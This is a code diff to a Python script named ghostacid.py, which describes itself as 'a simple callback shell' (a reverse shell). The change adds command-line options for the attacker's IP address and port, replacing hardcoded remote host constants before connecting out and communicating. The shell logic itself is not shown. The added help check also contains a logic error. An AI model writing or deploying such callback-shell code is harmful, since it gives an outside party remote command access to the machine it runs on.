@@ -51,6 +51,8 @@ import socket
 import pwd
 import os
 import subprocess
+import argparse
+import sys
 
 ################################################################################
 ################################################################################
@@ -155,7 +157,21 @@ def main():
     """
     The main entrance for application
     """
-    c_obj = Communicate(host=REMOTE_HOST, port=REMOTE_PORT)
+
+    if len(sys.argv) < 5 and ("-h" not in sys.argv or "--help" not in sys.argv):
+        print "Usage:\n./ghostacid.py -i 127.0.0.1 -p 8080"
+        sys.exit()
+    
+    parser = argparse.ArgumentParser(description="A simple callback shell")
+    parser.add_argument("-i", "--ip-hostname", action="store", 
+                              dest="ip_hostname", default="127.0.0.1")
+    parser.add_argument("-p", "--port", action="store", 
+                              dest="port", default=8080)
+    args = parser.parse_args()
+    port = int(args.port)
+    ip_hostname = str(args.ip_hostname)
+
+    c_obj = Communicate(host=ip_hostname, port=port)
     c_obj.connect_and_communicate(callback=None)
 
 ################################################################################
